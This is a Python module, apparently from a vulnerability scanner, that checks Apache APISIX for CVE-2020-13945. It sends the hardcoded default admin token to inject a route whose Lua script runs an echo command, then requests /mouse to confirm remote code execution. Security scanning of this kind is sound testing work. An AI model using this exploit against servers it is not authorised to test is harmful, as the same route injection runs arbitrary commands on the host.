#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from lib.tool.md5 import md5, random_int_1
from lib.tool import check
from thirdparty import requests
from time import sleep
import re

def cve_2020_13945_scan(self, url):
    ''' 在用户未指定管理员Token或使用了默认配置文件的情况下
            Apache APISIX将使用默认的管理员Token: edd1c9f034335f136f87ad84b625c8f1
            攻击者利用这个Token可以访问到管理员接口, 进而通过script参数来插入任意LUA脚本并执行
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'unAuthorized'
    vul_info['vul_id'] = 'CVE-2020-13945'
    vul_info['vul_method'] = 'POST'
    vul_info['headers'] = {
        'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1'     # * 默认密钥
    }

    headers = self.headers.copy()
    headers.update(vul_info['headers'])

    for payload in self.cve_2020_13945_payloads:
        random_num = random_int_1(6)
        
        path = payload['path']
        data = payload['data'].replace('RCECOMMAND', 'echo ' + str(random_num))
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            res1 = requests.post(
                target, 
                timeout=self.timeout, 
                headers=headers,
                data=data, 
                proxies=self.proxies, 
                verify=False
            )

            logger.logging(vul_info, res1.status_code, res1)          # * LOG

            if (('create_time' in res1.text) and (res1.status_code == 201)):
                verify_url = url + 'mouse'
                verify_res = requests.get(
                    verify_url, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, verify_res.status_code, verify_res)      # * LOG
            else:
                return None


            # todo 判断
            if (str(random_num) in check.check_res(verify_res.text, str(random_num))):
                results = {
                    'Verify': url + 'mouse',
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Payload-1': {
                        'Method': vul_info['vul_method'],
                        'Url': url,
                        'Path': path,
                        'Headers': vul_info['headers'],
                    },
                    'Request-1': res1,
                    'Payload-2': {
                        'Method': 'GET',
                        'Path': '/mouse'
                    }
                }
                return results

        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
